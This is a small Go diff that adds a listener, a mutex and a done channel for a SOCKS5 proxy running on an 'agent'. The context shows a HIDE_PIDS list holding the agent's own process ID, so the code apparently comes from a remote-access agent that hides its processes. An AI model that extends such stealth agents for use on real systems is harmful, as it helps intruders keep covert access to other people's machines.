@@ -1,9 +1,11 @@
 package def
 
 import (
+	"net"
 	"net/http"
 	"os"
 	"strconv"
+	"sync"
 
 	"github.com/posener/h2conn"
 	"github.com/txthinking/socks5"
@@ -28,6 +30,15 @@ var (
 
 	// ProxyServer Socks5 proxy listening on agent
 	ProxyServer *socks5.Server
+
+	// ProxyListener Socks5 proxy listener
+	ProxyListener net.Listener
+
+	// ProxyLock protects ProxyServer and ProxyListener
+	ProxyLock sync.Mutex
+
+	// ProxyDone channel to signal proxy server exit
+	ProxyDone chan struct{}
 
 	// HIDE_PIDS all the processes
 	HIDE_PIDS = []string{strconv.Itoa(os.Getpid())}
